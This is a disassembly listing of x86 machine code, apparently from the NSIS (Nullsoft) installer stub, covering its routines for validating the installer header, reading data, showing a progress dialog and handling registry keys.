  402bbc:	23 40 00             	and    0x0(%eax),%eax
  402bbf:	14 24                	adc    $0x24,%al
  402bc1:	40                   	inc    %eax
  402bc2:	00 55 24             	add    %dl,0x24(%ebp)
  402bc5:	40                   	inc    %eax
  402bc6:	00 aa 24 40 00 4a    	add    %ch,0x4a004024(%edx)
  402bcc:	25 40 00 bc 25       	and    $0x25bc0040,%eax
  402bd1:	40                   	inc    %eax
  402bd2:	00 24 26             	add    %ah,(%esi,%eiz,1)
  402bd5:	40                   	inc    %eax
  402bd6:	00 38                	add    %bh,(%eax)
  402bd8:	26 40                	es inc %eax
  402bda:	00 5a 26             	add    %bl,0x26(%edx)
  402bdd:	40                   	inc    %eax
  402bde:	00 a1 26 40 00 5e    	add    %ah,0x5e004026(%ecx)
  402be4:	27                   	daa
  402be5:	40                   	inc    %eax
  402be6:	00 92 27 40 00 ac    	add    %dl,-0x53ffbfd9(%edx)
  402bec:	27                   	daa
  402bed:	40                   	inc    %eax
  402bee:	00 d6                	add    %dl,%dh
  402bf0:	27                   	daa
  402bf1:	40                   	inc    %eax
  402bf2:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402bf5:	40                   	inc    %eax
  402bf6:	00 25 29 40 00 b6    	add    %ah,0xb6004029
  402bfc:	29 40 00             	sub    %eax,0x0(%eax)
  402bff:	22 2a                	and    (%edx),%ch
  402c01:	40                   	inc    %eax
  402c02:	00 f1                	add    %dh,%cl
  402c04:	2a 40 00             	sub    0x0(%eax),%al
  402c07:	cc                   	int3
  402c08:	2a 40 00             	sub    0x0(%eax),%al
  402c0b:	fa                   	cli
  402c0c:	1a 40 00             	sbb    0x0(%eax),%al
  402c0f:	01 1b                	add    %ebx,(%ebx)
  402c11:	40                   	inc    %eax
  402c12:	00 08                	add    %cl,(%eax)
  402c14:	1b 40 00             	sbb    0x0(%eax),%eax
  402c17:	0d 1b 40 00 1d       	or     $0x1d00401b,%eax
  402c1c:	1b 40 00             	sbb    0x0(%eax),%eax
  402c1f:	21 1b                	and    %ebx,(%ebx)
  402c21:	40                   	inc    %eax
  402c22:	00 25 1b 40 00 2e    	add    %ah,0x2e00401b
  402c28:	1b 40 00             	sbb    0x0(%eax),%eax
  402c2b:	37                   	aaa
  402c2c:	1b 40 00             	sbb    0x0(%eax),%eax
  402c2f:	44                   	inc    %esp
  402c30:	1b 40 00             	sbb    0x0(%eax),%eax
  402c33:	54                   	push   %esp
  402c34:	1b 40 00             	sbb    0x0(%eax),%eax
  402c37:	72 1b                	jb     0x402c54
  402c39:	40                   	inc    %eax
  402c3a:	00 79 1b             	add    %bh,0x1b(%ecx)
  402c3d:	40                   	inc    %eax
  402c3e:	00 80 1b 40 00 8b    	add    %al,-0x74ffbfe5(%eax)
  402c44:	44                   	inc    %esp
  402c45:	24 04                	and    $0x4,%al
  402c47:	8b 0d 5c b8 40 00    	mov    0x40b85c,%ecx
  402c4d:	56                   	push   %esi
  402c4e:	ff 34 81             	push   (%ecx,%eax,4)
  402c51:	6a 00                	push   $0x0
  402c53:	e8 40 38 00 00       	call   0x406498
  402c58:	8b f0                	mov    %eax,%esi
  402c5a:	56                   	push   %esi
  402c5b:	e8 1c 37 00 00       	call   0x40637c
  402c60:	0f be 16             	movsbl (%esi),%edx
  402c63:	5e                   	pop    %esi
  402c64:	c3                   	ret
  402c65:	56                   	push   %esi
  402c66:	8b 74 24 08          	mov    0x8(%esp),%esi
  402c6a:	85 f6                	test   %esi,%esi
  402c6c:	57                   	push   %edi
  402c6d:	8b c6                	mov    %esi,%eax
  402c6f:	7d 02                	jge    0x402c73
  402c71:	f7 d8                	neg    %eax
  402c73:	8b 15 5c b8 40 00    	mov    0x40b85c,%edx
  402c79:	8b c8                	mov    %eax,%ecx
  402c7b:	83 e1 0f             	and    $0xf,%ecx
  402c7e:	c1 f8 04             	sar    $0x4,%eax
  402c81:	ff 34 8a             	push   (%edx,%ecx,4)
  402c84:	c1 e0 0a             	shl    $0xa,%eax
  402c87:	05 20 a4 40 00       	add    $0x40a420,%eax
  402c8c:	50                   	push   %eax
  402c8d:	e8 06 38 00 00       	call   0x406498
  402c92:	85 f6                	test   %esi,%esi
  402c94:	8b f8                	mov    %eax,%edi
  402c96:	7d 06                	jge    0x402c9e
  402c98:	57                   	push   %edi
  402c99:	e8 61 3a 00 00       	call   0x4066ff
  402c9e:	8b c7                	mov    %edi,%eax
  402ca0:	5f                   	pop    %edi
  402ca1:	5e                   	pop    %esi
  402ca2:	c2 04 00             	ret    $0x4
  402ca5:	55                   	push   %ebp
  402ca6:	8b ec                	mov    %esp,%ebp
  402ca8:	8d 45 08             	lea    0x8(%ebp),%eax
  402cab:	50                   	push   %eax
  402cac:	8b 45 08             	mov    0x8(%ebp),%eax
  402caf:	0d 20 00 10 00       	or     $0x100020,%eax
  402cb4:	50                   	push   %eax
  402cb5:	6a 22                	push   $0x22
  402cb7:	e8 a9 ff ff ff       	call   0x402c65
  402cbc:	50                   	push   %eax
  402cbd:	a1 5c b8 40 00       	mov    0x40b85c,%eax
  402cc2:	ff 70 04             	push   0x4(%eax)
  402cc5:	e8 13 00 00 00       	call   0x402cdd
  402cca:	50                   	push   %eax
  402ccb:	e8 bb 35 00 00       	call   0x40628b
  402cd0:	f7 d8                	neg    %eax
  402cd2:	1b c0                	sbb    %eax,%eax
  402cd4:	f7 d0                	not    %eax
  402cd6:	23 45 08             	and    0x8(%ebp),%eax
  402cd9:	5d                   	pop    %ebp
  402cda:	c2 04 00             	ret    $0x4
  402cdd:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ce1:	85 c0                	test   %eax,%eax
  402ce3:	7c 0d                	jl     0x402cf2
  402ce5:	8b 0d e4 43 42 00    	mov    0x4243e4,%ecx
  402ceb:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402cf2:	c2 04 00             	ret    $0x4
  402cf5:	55                   	push   %ebp
  402cf6:	8b ec                	mov    %esp,%ebp
  402cf8:	8d 45 10             	lea    0x10(%ebp),%eax
  402cfb:	50                   	push   %eax
  402cfc:	8b 45 10             	mov    0x10(%ebp),%eax
  402cff:	0d 20 00 10 00       	or     $0x100020,%eax
  402d04:	50                   	push   %eax
  402d05:	ff 75 0c             	push   0xc(%ebp)
  402d08:	ff 75 08             	push   0x8(%ebp)
  402d0b:	e8 cd ff ff ff       	call   0x402cdd
  402d10:	50                   	push   %eax
  402d11:	e8 a3 35 00 00       	call   0x4062b9
  402d16:	f7 d8                	neg    %eax
  402d18:	1b c0                	sbb    %eax,%eax
  402d1a:	f7 d0                	not    %eax
  402d1c:	23 45 10             	and    0x10(%ebp),%eax
  402d1f:	5d                   	pop    %ebp
  402d20:	c2 0c 00             	ret    $0xc
  402d23:	55                   	push   %ebp
  402d24:	8b ec                	mov    %esp,%ebp
  402d26:	56                   	push   %esi
  402d27:	8b 75 0c             	mov    0xc(%ebp),%esi
  402d2a:	80 3e 00             	cmpb   $0x0,(%esi)
  402d2d:	75 07                	jne    0x402d36
  402d2f:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402d34:	eb 2c                	jmp    0x402d62
  402d36:	81 4d 10 20 00 10 00 	orl    $0x100020,0x10(%ebp)
  402d3d:	8d 45 10             	lea    0x10(%ebp),%eax
  402d40:	50                   	push   %eax
  402d41:	ff 75 08             	push   0x8(%ebp)
  402d44:	e8 94 ff ff ff       	call   0x402cdd
  402d49:	50                   	push   %eax
  402d4a:	e8 bb 34 00 00       	call   0x40620a
  402d4f:	85 c0                	test   %eax,%eax
  402d51:	74 0c                	je     0x402d5f
  402d53:	ff 75 10             	push   0x10(%ebp)
  402d56:	56                   	push   %esi
  402d57:	50                   	push   %eax
  402d58:	e8 0a 00 00 00       	call   0x402d67
  402d5d:	eb 03                	jmp    0x402d62
  402d5f:	6a 06                	push   $0x6
  402d61:	58                   	pop    %eax
  402d62:	5e                   	pop    %esi
  402d63:	5d                   	pop    %ebp
  402d64:	c2 0c 00             	ret    $0xc
  402d67:	55                   	push   %ebp
  402d68:	8b ec                	mov    %esp,%ebp
  402d6a:	81 ec 10 01 00 00    	sub    $0x110,%esp
  402d70:	53                   	push   %ebx
  402d71:	56                   	push   %esi
  402d72:	8b 75 10             	mov    0x10(%ebp),%esi
  402d75:	57                   	push   %edi
  402d76:	8b fe                	mov    %esi,%edi
  402d78:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402d7b:	81 e6 00 03 00 00    	and    $0x300,%esi
  402d81:	50                   	push   %eax
  402d82:	8b c6                	mov    %esi,%eax
  402d84:	83 e7 01             	and    $0x1,%edi
  402d87:	0c 09                	or     $0x9,%al
  402d89:	50                   	push   %eax
  402d8a:	ff 75 0c             	push   0xc(%ebp)
  402d8d:	ff 75 08             	push   0x8(%ebp)
  402d90:	e8 f6 34 00 00       	call   0x40628b
  402d95:	33 db                	xor    %ebx,%ebx
  402d97:	3b c3                	cmp    %ebx,%eax
  402d99:	0f 85 ab 00 00 00    	jne    0x402e4a
  402d9f:	f6 45 10 02          	testb  $0x2,0x10(%ebp)
  402da3:	74 23                	je     0x402dc8
  402da5:	53                   	push   %ebx
  402da6:	53                   	push   %ebx
  402da7:	53                   	push   %ebx
  402da8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402dab:	53                   	push   %ebx
  402dac:	50                   	push   %eax
  402dad:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402db3:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402db6:	50                   	push   %eax
  402db7:	53                   	push   %ebx
  402db8:	ff 75 fc             	push   -0x4(%ebp)
  402dbb:	ff 15 00 80 40 00    	call   *0x408000
  402dc1:	3d 03 01 00 00       	cmp    $0x103,%eax
  402dc6:	75 67                	jne    0x402e2f
  402dc8:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402dce:	68 05 01 00 00       	push   $0x105
  402dd3:	50                   	push   %eax
  402dd4:	53                   	push   %ebx
  402dd5:	8b 1d 04 80 40 00    	mov    0x408004,%ebx
  402ddb:	eb 27                	jmp    0x402e04
  402ddd:	85 ff                	test   %edi,%edi
  402ddf:	75 4e                	jne    0x402e2f
  402de1:	ff 75 10             	push   0x10(%ebp)
  402de4:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402dea:	50                   	push   %eax
  402deb:	ff 75 fc             	push   -0x4(%ebp)
  402dee:	e8 74 ff ff ff       	call   0x402d67
  402df3:	85 c0                	test   %eax,%eax
  402df5:	75 16                	jne    0x402e0d
  402df7:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
  402dfd:	68 05 01 00 00       	push   $0x105
  402e02:	50                   	push   %eax
  402e03:	57                   	push   %edi
  402e04:	ff 75 fc             	push   -0x4(%ebp)
  402e07:	ff d3                	call   *%ebx
  402e09:	85 c0                	test   %eax,%eax
  402e0b:	74 d0                	je     0x402ddd
  402e0d:	ff 75 fc             	push   -0x4(%ebp)
  402e10:	ff 15 10 80 40 00    	call   *0x408010
  402e16:	6a 03                	push   $0x3
  402e18:	e8 10 3a 00 00       	call   0x40682d
  402e1d:	85 c0                	test   %eax,%eax
  402e1f:	75 1e                	jne    0x402e3f
  402e21:	ff 75 0c             	push   0xc(%ebp)
  402e24:	ff 75 08             	push   0x8(%ebp)
  402e27:	ff 15 18 80 40 00    	call   *0x408018
  402e2d:	eb 1b                	jmp    0x402e4a
  402e2f:	ff 75 fc             	push   -0x4(%ebp)
  402e32:	ff 15 10 80 40 00    	call   *0x408010
  402e38:	b8 eb 03 00 00       	mov    $0x3eb,%eax
  402e3d:	eb 0b                	jmp    0x402e4a
  402e3f:	6a 00                	push   $0x0
  402e41:	56                   	push   %esi
  402e42:	ff 75 0c             	push   0xc(%ebp)
  402e45:	ff 75 08             	push   0x8(%ebp)
  402e48:	ff d0                	call   *%eax
  402e4a:	5f                   	pop    %edi
  402e4b:	5e                   	pop    %esi
  402e4c:	5b                   	pop    %ebx
  402e4d:	c9                   	leave
  402e4e:	c2 0c 00             	ret    $0xc
  402e51:	55                   	push   %ebp
  402e52:	8b ec                	mov    %esp,%ebp
  402e54:	83 ec 40             	sub    $0x40,%esp
  402e57:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402e5e:	75 19                	jne    0x402e79
  402e60:	6a 00                	push   $0x0
  402e62:	68 fa 00 00 00       	push   $0xfa
  402e67:	6a 01                	push   $0x1
  402e69:	ff 75 08             	push   0x8(%ebp)
  402e6c:	ff 15 04 82 40 00    	call   *0x408204
  402e72:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402e79:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402e80:	75 45                	jne    0x402ec7
  402e82:	e8 46 00 00 00       	call   0x402ecd
  402e87:	83 3d 70 43 42 00 00 	cmpl   $0x0,0x424370
  402e8e:	b9 3c a0 40 00       	mov    $0x40a03c,%ecx
  402e93:	75 05                	jne    0x402e9a
  402e95:	b9 20 a0 40 00       	mov    $0x40a020,%ecx
  402e9a:	50                   	push   %eax
  402e9b:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402e9e:	51                   	push   %ecx
  402e9f:	50                   	push   %eax
  402ea0:	ff 15 18 82 40 00    	call   *0x408218
  402ea6:	83 c4 0c             	add    $0xc,%esp
  402ea9:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402eac:	50                   	push   %eax
  402ead:	ff 75 08             	push   0x8(%ebp)
  402eb0:	ff 15 08 82 40 00    	call   *0x408208
  402eb6:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402eb9:	50                   	push   %eax
  402eba:	68 06 04 00 00       	push   $0x406
  402ebf:	ff 75 08             	push   0x8(%ebp)
  402ec2:	e8 32 2c 00 00       	call   0x405af9
  402ec7:	33 c0                	xor    %eax,%eax
  402ec9:	c9                   	leave
  402eca:	c2 10 00             	ret    $0x10
  402ecd:	8b 0d f8 78 41 00    	mov    0x4178f8,%ecx
  402ed3:	a1 0c f9 41 00       	mov    0x41f90c,%eax
  402ed8:	3b c8                	cmp    %eax,%ecx
  402eda:	72 02                	jb     0x402ede
  402edc:	8b c8                	mov    %eax,%ecx
  402ede:	50                   	push   %eax
  402edf:	6a 64                	push   $0x64
  402ee1:	51                   	push   %ecx
  402ee2:	ff 15 3c 81 40 00    	call   *0x40813c
  402ee8:	c3                   	ret
  402ee9:	55                   	push   %ebp
  402eea:	8b ec                	mov    %esp,%ebp
  402eec:	83 ec 40             	sub    $0x40,%esp
  402eef:	56                   	push   %esi
  402ef0:	33 f6                	xor    %esi,%esi
  402ef2:	39 75 08             	cmp    %esi,0x8(%ebp)
  402ef5:	74 18                	je     0x402f0f
  402ef7:	a1 08 f9 41 00       	mov    0x41f908,%eax
  402efc:	3b c6                	cmp    %esi,%eax
  402efe:	74 07                	je     0x402f07
  402f00:	50                   	push   %eax
  402f01:	ff 15 fc 81 40 00    	call   *0x4081fc
  402f07:	89 35 08 f9 41 00    	mov    %esi,0x41f908
  402f0d:	eb 76                	jmp    0x402f85
  402f0f:	39 35 08 f9 41 00    	cmp    %esi,0x41f908
  402f15:	74 08                	je     0x402f1f
  402f17:	56                   	push   %esi
  402f18:	e8 4c 39 00 00       	call   0x406869
  402f1d:	eb 66                	jmp    0x402f85
  402f1f:	ff 15 cc 80 40 00    	call   *0x4080cc
  402f25:	3b 05 6c 43 42 00    	cmp    0x42436c,%eax
  402f2b:	76 58                	jbe    0x402f85
  402f2d:	39 35 68 43 42 00    	cmp    %esi,0x424368
  402f33:	74 2d                	je     0x402f62
  402f35:	f6 05 14 44 42 00 01 	testb  $0x1,0x424414
  402f3c:	74 47                	je     0x402f85
  402f3e:	e8 8a ff ff ff       	call   0x402ecd
  402f43:	50                   	push   %eax
  402f44:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402f47:	68 54 a0 40 00       	push   $0x40a054
  402f4c:	50                   	push   %eax
  402f4d:	ff 15 18 82 40 00    	call   *0x408218
  402f53:	83 c4 0c             	add    $0xc,%esp
  402f56:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402f59:	50                   	push   %eax
  402f5a:	56                   	push   %esi
  402f5b:	e8 e9 25 00 00       	call   0x405549
  402f60:	eb 23                	jmp    0x402f85
  402f62:	56                   	push   %esi
  402f63:	68 51 2e 40 00       	push   $0x402e51
  402f68:	56                   	push   %esi
  402f69:	6a 6f                	push   $0x6f
  402f6b:	ff 35 60 43 42 00    	push   0x424360
  402f71:	ff 15 00 82 40 00    	call   *0x408200
  402f77:	6a 05                	push   $0x5
  402f79:	50                   	push   %eax
  402f7a:	a3 08 f9 41 00       	mov    %eax,0x41f908
  402f7f:	ff 15 14 82 40 00    	call   *0x408214
  402f85:	5e                   	pop    %esi
  402f86:	c9                   	leave
  402f87:	c3                   	ret
  402f88:	55                   	push   %ebp
  402f89:	8b ec                	mov    %esp,%ebp
  402f8b:	81 ec 2c 01 00 00    	sub    $0x12c,%esp
  402f91:	53                   	push   %ebx
  402f92:	56                   	push   %esi
  402f93:	57                   	push   %edi
  402f94:	33 ff                	xor    %edi,%edi
  402f96:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402f99:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402f9c:	89 7d f8             	mov    %edi,-0x8(%ebp)
  402f9f:	ff 15 cc 80 40 00    	call   *0x4080cc
  402fa5:	be 00 bc 42 00       	mov    $0x42bc00,%esi
  402faa:	68 00 04 00 00       	push   $0x400
  402faf:	05 e8 03 00 00       	add    $0x3e8,%eax
  402fb4:	56                   	push   %esi
  402fb5:	57                   	push   %edi
  402fb6:	a3 6c 43 42 00       	mov    %eax,0x42436c
  402fbb:	ff 15 bc 80 40 00    	call   *0x4080bc
  402fc1:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  402fc6:	eb 27                	jmp    0x402fef
  402fc8:	ff 15 c0 80 40 00    	call   *0x4080c0
  402fce:	83 f8 20             	cmp    $0x20,%eax
  402fd1:	0f 85 1a 01 00 00    	jne    0x4030f1
  402fd7:	ff 45 f8             	incl   -0x8(%ebp)
  402fda:	83 7d f8 06          	cmpl   $0x6,-0x8(%ebp)
  402fde:	0f 87 0d 01 00 00    	ja     0x4030f1
  402fe4:	68 fa 00 00 00       	push   $0xfa
  402fe9:	ff 15 d0 80 40 00    	call   *0x4080d0
  402fef:	6a 03                	push   $0x3
  402ff1:	53                   	push   %ebx
  402ff2:	56                   	push   %esi
  402ff3:	e8 a0 2f 00 00       	call   0x405f98
  402ff8:	8b f8                	mov    %eax,%edi
  402ffa:	83 ff ff             	cmp    $0xffffffff,%edi
  402ffd:	89 3d 18 a0 40 00    	mov    %edi,0x40a018
  403003:	74 c3                	je     0x402fc8
  403005:	56                   	push   %esi
  403006:	be 00 ac 42 00       	mov    $0x42ac00,%esi
  40300b:	56                   	push   %esi
  40300c:	e8 f4 33 00 00       	call   0x406405
  403011:	56                   	push   %esi
  403012:	e8 c7 2d 00 00       	call   0x405dde
  403017:	50                   	push   %eax
  403018:	68 00 c0 42 00       	push   $0x42c000
  40301d:	e8 e3 33 00 00       	call   0x406405
  403022:	33 db                	xor    %ebx,%ebx
  403024:	53                   	push   %ebx
  403025:	57                   	push   %edi
  403026:	ff 15 c4 80 40 00    	call   *0x4080c4
  40302c:	3b c3                	cmp    %ebx,%eax
  40302e:	a3 0c f9 41 00       	mov    %eax,0x41f90c
  403033:	8b f0                	mov    %eax,%esi
  403035:	0f 86 f3 00 00 00    	jbe    0x40312e
  40303b:	bb 00 79 41 00       	mov    $0x417900,%ebx
  403040:	a1 74 43 42 00       	mov    0x424374,%eax
  403045:	8b fe                	mov    %esi,%edi
  403047:	f7 d8                	neg    %eax
  403049:	1b c0                	sbb    %eax,%eax
  40304b:	25 00 7e 00 00       	and    $0x7e00,%eax
  403050:	05 00 02 00 00       	add    $0x200,%eax
  403055:	3b f0                	cmp    %eax,%esi
  403057:	72 02                	jb     0x40305b
  403059:	8b f8                	mov    %eax,%edi
  40305b:	57                   	push   %edi
  40305c:	53                   	push   %ebx
  40305d:	e8 6b 04 00 00       	call   0x4034cd
  403062:	85 c0                	test   %eax,%eax
  403064:	0f 84 5f 01 00 00    	je     0x4031c9
  40306a:	83 3d 74 43 42 00 00 	cmpl   $0x0,0x424374
  403071:	0f 85 84 00 00 00    	jne    0x4030fb
  403077:	6a 1c                	push   $0x1c
  403079:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40307c:	53                   	push   %ebx
  40307d:	50                   	push   %eax
  40307e:	e8 d0 2e 00 00       	call   0x405f53
  403083:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403086:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  40308b:	75 7c                	jne    0x403109
  40308d:	81 7d dc ef be ad de 	cmpl   $0xdeadbeef,-0x24(%ebp)
  403094:	75 73                	jne    0x403109
  403096:	81 7d e8 49 6e 73 74 	cmpl   $0x74736e49,-0x18(%ebp)
  40309d:	75 6a                	jne    0x403109
  40309f:	81 7d e4 73 6f 66 74 	cmpl   $0x74666f73,-0x1c(%ebp)
  4030a6:	75 61                	jne    0x403109
  4030a8:	81 7d e0 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x20(%ebp)
  4030af:	75 58                	jne    0x403109
  4030b1:	09 45 08             	or     %eax,0x8(%ebp)
  4030b4:	8b 45 08             	mov    0x8(%ebp),%eax
  4030b7:	8b 0d f8 78 41 00    	mov    0x4178f8,%ecx
  4030bd:	83 e0 02             	and    $0x2,%eax
  4030c0:	09 05 00 44 42 00    	or     %eax,0x424400
  4030c6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4030c9:	3b c6                	cmp    %esi,%eax
  4030cb:	89 0d 74 43 42 00    	mov    %ecx,0x424374
  4030d1:	0f 87 36 01 00 00    	ja     0x40320d
  4030d7:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4030db:	75 06                	jne    0x4030e3
  4030dd:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  4030e1:	75 49                	jne    0x40312c
  4030e3:	ff 45 f4             	incl   -0xc(%ebp)
  4030e6:	8d 70 fc             	lea    -0x4(%eax),%esi
  4030e9:	3b fe                	cmp    %esi,%edi
  4030eb:	76 1c                	jbe    0x403109
  4030ed:	8b fe                	mov    %esi,%edi
  4030ef:	eb 18                	jmp    0x403109
  4030f1:	b8 74 a1 40 00       	mov    $0x40a174,%eax
  4030f6:	e9 5a 01 00 00       	jmp    0x403255
  4030fb:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  4030ff:	75 08                	jne    0x403109
  403101:	6a 00                	push   $0x0
  403103:	e8 e1 fd ff ff       	call   0x402ee9
  403108:	59                   	pop    %ecx
  403109:	3b 35 0c f9 41 00    	cmp    0x41f90c,%esi
  40310f:	73 0d                	jae    0x40311e
  403111:	57                   	push   %edi
  403112:	53                   	push   %ebx
  403113:	ff 75 fc             	push   -0x4(%ebp)
  403116:	e8 c9 37 00 00       	call   0x4068e4
  40311b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40311e:	01 3d f8 78 41 00    	add    %edi,0x4178f8
  403124:	2b f7                	sub    %edi,%esi
  403126:	0f 85 14 ff ff ff    	jne    0x403040
  40312c:	33 db                	xor    %ebx,%ebx
  40312e:	6a 01                	push   $0x1
  403130:	e8 b4 fd ff ff       	call   0x402ee9
  403135:	39 1d 74 43 42 00    	cmp    %ebx,0x424374
  40313b:	59                   	pop    %ecx
  40313c:	0f 84 cb 00 00 00    	je     0x40320d
  403142:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  403145:	74 2a                	je     0x403171
  403147:	ff 35 f8 78 41 00    	push   0x4178f8
  40314d:	e8 91 03 00 00       	call   0x4034e3
  403152:	8d 45 08             	lea    0x8(%ebp),%eax
  403155:	6a 04                	push   $0x4
  403157:	50                   	push   %eax
  403158:	e8 70 03 00 00       	call   0x4034cd
  40315d:	85 c0                	test   %eax,%eax
  40315f:	0f 84 a8 00 00 00    	je     0x40320d
  403165:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403168:	3b 45 08             	cmp    0x8(%ebp),%eax
  40316b:	0f 85 9c 00 00 00    	jne    0x40320d
  403171:	ff 75 ec             	push   -0x14(%ebp)
  403174:	6a 40                	push   $0x40
  403176:	ff 15 0c 81 40 00    	call   *0x40810c
  40317c:	b9 70 b8 40 00       	mov    $0x40b870,%ecx
  403181:	8b f0                	mov    %eax,%esi
  403183:	e8 ca 37 00 00       	call   0x406952
  403188:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
  40318e:	68 00 b4 42 00       	push   $0x42b400
  403193:	50                   	push   %eax
  403194:	e8 2e 2e 00 00       	call   0x405fc7
  403199:	53                   	push   %ebx
  40319a:	68 00 01 00 04       	push   $0x4000100
  40319f:	6a 02                	push   $0x2
  4031a1:	53                   	push   %ebx
  4031a2:	53                   	push   %ebx
  4031a3:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
  4031a9:	68 00 00 00 c0       	push   $0xc0000000
  4031ae:	50                   	push   %eax
  4031af:	ff 15 c8 80 40 00    	call   *0x4080c8
  4031b5:	83 f8 ff             	cmp    $0xffffffff,%eax
  4031b8:	a3 1c a0 40 00       	mov    %eax,0x40a01c
  4031bd:	75 14                	jne    0x4031d3
  4031bf:	b8 30 a1 40 00       	mov    $0x40a130,%eax
  4031c4:	e9 8c 00 00 00       	jmp    0x403255
  4031c9:	6a 01                	push   $0x1
  4031cb:	e8 19 fd ff ff       	call   0x402ee9
  4031d0:	59                   	pop    %ecx
  4031d1:	eb 3a                	jmp    0x40320d
  4031d3:	a1 74 43 42 00       	mov    0x424374,%eax
  4031d8:	83 c0 1c             	add    $0x1c,%eax
  4031db:	50                   	push   %eax
  4031dc:	e8 02 03 00 00       	call   0x4034e3
  4031e1:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4031e4:	ff 75 ec             	push   -0x14(%ebp)
  4031e7:	f7 d1                	not    %ecx
  4031e9:	83 e1 04             	and    $0x4,%ecx
  4031ec:	a3 10 f9 41 00       	mov    %eax,0x41f910
  4031f1:	2b c1                	sub    %ecx,%eax
  4031f3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4031f6:	56                   	push   %esi
  4031f7:	53                   	push   %ebx
  4031f8:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  4031fc:	6a ff                	push   $0xffffffff
  4031fe:	a3 04 f9 41 00       	mov    %eax,0x41f904
  403203:	e8 54 00 00 00       	call   0x40325c
  403208:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  40320b:	74 07                	je     0x403214
  40320d:	b8 60 a0 40 00       	mov    $0x40a060,%eax
  403212:	eb 41                	jmp    0x403255
  403214:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  403218:	89 35 70 43 42 00    	mov    %esi,0x424370
  40321e:	8b 06                	mov    (%esi),%eax
  403220:	a3 78 43 42 00       	mov    %eax,0x424378
  403225:	74 06                	je     0x40322d
  403227:	ff 05 7c 43 42 00    	incl   0x42437c
  40322d:	6a 08                	push   $0x8
  40322f:	8d 46 44             	lea    0x44(%esi),%eax
  403232:	59                   	pop    %ecx
  403233:	83 e8 08             	sub    $0x8,%eax
  403236:	01 30                	add    %esi,(%eax)
  403238:	49                   	dec    %ecx
  403239:	75 f8                	jne    0x403233
  40323b:	a1 00 f9 41 00       	mov    0x41f900,%eax
  403240:	6a 40                	push   $0x40
  403242:	89 46 3c             	mov    %eax,0x3c(%esi)
  403245:	83 c6 04             	add    $0x4,%esi
  403248:	56                   	push   %esi
  403249:	68 80 43 42 00       	push   $0x424380
  40324e:	e8 00 2d 00 00       	call   0x405f53
  403253:	33 c0                	xor    %eax,%eax
  403255:	5f                   	pop    %edi
  403256:	5e                   	pop    %esi
  403257:	5b                   	pop    %ebx
  403258:	c9                   	leave
  403259:	c2 04 00             	ret    $0x4
  40325c:	55                   	push   %ebp
  40325d:	8b ec                	mov    %esp,%ebp
  40325f:	51                   	push   %ecx
  403260:	8b 45 08             	mov    0x8(%ebp),%eax
  403263:	53                   	push   %ebx
  403264:	56                   	push   %esi
  403265:	33 f6                	xor    %esi,%esi
  403267:	3b c6                	cmp    %esi,%eax
  403269:	7c 1c                	jl     0x403287
  40326b:	8b 0d b8 43 42 00    	mov    0x4243b8,%ecx
  403271:	56                   	push   %esi
  403272:	03 c1                	add    %ecx,%eax
  403274:	56                   	push   %esi
  403275:	50                   	push   %eax
  403276:	a3 00 f9 41 00       	mov    %eax,0x41f900
  40327b:	ff 35 1c a0 40 00    	push   0x40a01c
  403281:	ff 15 28 81 40 00    	call   *0x408128
  403287:	6a 04                	push   $0x4
  403289:	e8 d6 00 00 00       	call   0x403364
  40328e:	3b c6                	cmp    %esi,%eax
  403290:	0f 8c c8 00 00 00    	jl     0x40335e
  403296:	8d 45 08             	lea    0x8(%ebp),%eax
  403299:	6a 04                	push   $0x4
  40329b:	50                   	push   %eax
  40329c:	ff 35 1c a0 40 00    	push   0x40a01c
  4032a2:	e8 69 2d 00 00       	call   0x406010
  4032a7:	85 c0                	test   %eax,%eax
  4032a9:	0f 84 9f 00 00 00    	je     0x40334e
  4032af:	ff 75 08             	push   0x8(%ebp)
  4032b2:	83 05 00 f9 41 00 04 	addl   $0x4,0x41f900
  4032b9:	e8 a6 00 00 00       	call   0x403364
  4032be:	8b d8                	mov    %eax,%ebx
  4032c0:	3b de                	cmp    %esi,%ebx
  4032c2:	0f 8c 94 00 00 00    	jl     0x40335c
  4032c8:	39 75 10             	cmp    %esi,0x10(%ebp)
  4032cb:	75 5d                	jne    0x40332a
  4032cd:	39 75 08             	cmp    %esi,0x8(%ebp)
  4032d0:	0f 8e 86 00 00 00    	jle    0x40335c
